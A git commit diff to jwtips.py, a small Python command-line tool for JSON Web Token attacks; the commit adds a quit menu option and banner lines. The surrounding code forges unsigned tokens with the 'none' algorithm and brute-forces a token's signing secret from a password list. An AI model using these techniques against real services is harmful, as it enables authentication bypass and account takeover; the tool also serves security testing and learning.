24a72d087cb1e0af01f9f3d39d57e8d1bb98653c
Kynda <47142028+Shadawks@users.noreply.github.com>
2020-06-02 22:22:19 +0200

    Add exit option + interface

--- jwtips.py
+++ jwtips.py
@@ -15,9 +15,10 @@ def clear():
 class JWTips():
     def __init__(self):
         self.run = True
+        self.banner = "-----------------------------------------------------------------------------------------------------"
         clear()
     def gui(self):
-        print('- - - [  JWTips! By Kynda  ] - - -\n\n[1] Token information\n[2] Change algorithm to None\n[3] Bruteforce token')
+        print('- - - [  JWTips! By Kynda  ] - - -\n\n[1] Token information\n\n[2] Change algorithm to None\n\n[3] Bruteforce token\n\n[4] Quit')
         n = input("\n\n[>>] ")
         if n == "1":
             self.infos()
@@ -25,29 +26,43 @@ class JWTips():
             self.toNone()
         elif n == "3":
             self.bruteForce()
+        elif n == "4":
+            clear()
+            print("[+] Good bye !")
+            self.run = False
         else:
             clear()
+            print(f'\n\n\n{self.banner}\n')
             print('[x] Choice Error - Invalid number\n')
+            print(f'{self.banner}\n')
     def infos(self):
         try:
             clear()
+            print(f'{self.banner}\n')
             token = input('JSON Web Token : ')
             header,payload = token.split('.')[0],token.split('.')[1]
             print("[Token content]\n\n\n[+] Header : {}\n\n[+] Payload : {}\n".format(b64decode(header+'==').decode('utf-8'),b64decode(payload+'==').decode('utf-8')))
+            print(f'{self.banner}\n')
         except IndexError:
             print('[x] Format Error - Invalid token\n')
+            print(f'{self.banner}\n')
         except binascii.Error:
             print('[x] Padding Error - Invalid token\n')
+            print(f'{self.banner}\n')
     def toNone(self):
         clear()
+        print(f'\n\n\n{self.banner}\n')
         try:
             payload = json.loads(input('Payload ? ( Example => {"role":"user"} ) : '))
             print("[+] New JWT : {}\n".format(jwt.encode(payload,'',algorithm=None).decode('utf-8')))
+            print(f'{self.banner}\n')
         except json.decoder.JSONDecodeError:
             print("[x] JSON Error - Invalid Payload Format\n")
+            print(f'{self.banner}\n')
     def bruteForce(self):
         clear()
         Tk().withdraw()
+        print(f'\n\n\n{self.banner}\n')
         token = input('JSON Web Token : ')
         pass_list = [i.strip() for i in open(askopenfilename(title="Password list ?"),'r',encoding='utf-8')]
         try:
@@ -55,13 +70,17 @@ class JWTips():
             for i in pass_list:
                 if jwt.encode(payload,i,algorithm=algo).decode('utf-8') == token:
                     print("[+] Good news !\nSecret Found : {}\n".format(i))
+                    print(f'{self.banner}\n')
                     break
         except IndexError:
             print('[x] Format Error - Invalid token\n')
+            print(f'{self.banner}\n')
         except binascii.Error:
             print('[x] Padding Error - Invalid token\n')
+            print(f'{self.banner}\n')
         except json.decoder.JSONDecodeError:
             print("[x] JSON Error - Invalid Payload Format\n")
+            print(f'{self.banner}\n')
 
 
 
